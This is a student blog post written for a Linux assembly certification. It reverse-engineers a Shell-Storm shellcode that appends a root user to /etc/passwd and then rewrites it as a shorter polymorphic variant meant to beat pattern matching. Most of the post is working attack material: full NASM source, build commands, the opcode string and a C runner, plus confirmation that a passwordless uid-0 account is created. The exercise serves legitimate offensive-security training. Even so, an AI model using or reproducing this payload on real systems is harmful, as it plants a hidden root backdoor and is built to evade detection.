# Assignment 6: Append Passwd

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-670

## Problem

- Take up 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching
- The polymorphic versions cannot be larger than 150% of the existing shellcode
- Bonus points for making it shorter in length than original

## Solution

In this post we are going to look at the Append Passwd shellcode avaiable at ![http://shell-storm.org/shellcode/files/shellcode-561.php](http://shell-storm.org/shellcode/files/shellcode-561.php "").

This shellcode is meant to add a new system user to the `/etc/passwd` file.


### Shellcode Analysis

To begin, lets grab a copy of that shellcode, compile it, and trace it with GDB:

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/passwd/gdb1.png "GDB")

As can be appreciated, the shellcode uses the JMP-CALL-POP technique to get the payload address on the stack. The payload in this case is is the following string:

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/passwd/gdb2.png "Payload")

which is of course the file name and the user string to be appended. 

The shellcode then goes on to replace the `#` symbols in the payload by `\x00`s, effectively NULL-terminating both strings. Then, a file descriptor for `/etc/passwd` is created with the `open()` system call, and `toor::0:0:t00r:/root:/bin/bash` is appended with the `write()` system call. Finally, the program gracefully exits with the `exit()` system call. 


### Polymorphic Shellcode

To re-create this shellcode, several tweaks were applied to make the shellcode shorter. In no particular order:
- `/etc/passwd` is pushed on the stack, which changes the operations needed before the `open()` call
- `x::0:0::/:/bin/sh` is appended, which trims down a few bytes
- payload length is explicitly specified (not calculated at run time)
- additional steps, associated with the original shellcode, are cut and/or rewritten

The final version looks like this:

### a6-passwd.nasm
```nasm
; SLAE Assignment 6: Append Passwd (morphed)
; http://shell-storm.org/shellcode/files/shellcode-561.php
; Original Shellcode Length:	107 
; Morphed Shellcode Length:		74

global _start
section .text
_start:
	jmp short stage

append:
	pop esi
	cdq
	mov byte [esi+24], dl

	push byte 0x5 				; #define __NR_open 5
	pop eax 					; int open(const char *pathname, int flags);
	push edx
	push byte 0x64 				; d
	push word 0x7773			; ws
	push 0x7361702f				; sap/
	push 0x6374652f				; cte/
	mov ebx, esp 				; *pathname -> /etc/passwd
	xor ecx, ecx 		
	inc ecx 					; flags = 1		#define O_WRONLY        00000001
	mov ch, 0x4 				; flags = 401	#define O_NOCTTY        00000400
	int 0x80 					; open

	xchg eax, ebx 				; fd 
	push byte 0x4 				; #define __NR_write 4
	pop eax 					; ssize_t write(int fd, const void *buf, size_t count);
	mov ecx, esi 				; *buf -> x::0:0::/:/bin/sh
	push byte 0x11 				; length = 17 bytes
	pop edx 					; count = 17
	int 0x80 					; write

	push byte 0x1 				; #define __NR_exit 1
	pop eax 					; int exit(int status)
	int 0x80 					; exit

stage:
	call append
	usr: db "x::0:0::/:/bin/sh"
```

Let's compile, link, and get the opcodes:

```
nasm -f elf32 -o a6-passwd.o a6-passwd.nasm
ld -o a6-passwd a6-passwd.o 
objdump -d ./a6-passwd |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
```

Make an executable skeleton for the opcodes:

### passwd.c
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x32\x5e\x99\x88\x56\x18\x6a\x05\x58\x52\x6a\x64\x66\x68\x73\x77\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x89\xe3\x31\xc9\x41\xb5\x04\xcd\x80\x93\x6a\x04\x58\x89\xf1\x6a\x11\x5a\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xc9\xff\xff\xff\x78\x3a\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

And finally compile, execute, and check:

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/passwd/example.png "Example")

Looks like everything works as expected. The new user `x` is able to use `/bin/sh` with root privileges.

Now let's go on to check how the morphed version compares to the original shellcode.

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/passwd/length.png "Shellcode length")

Our morphed version is 74 bytes in length, which is of course 33 bytes shorter than the original 107 bytes. 
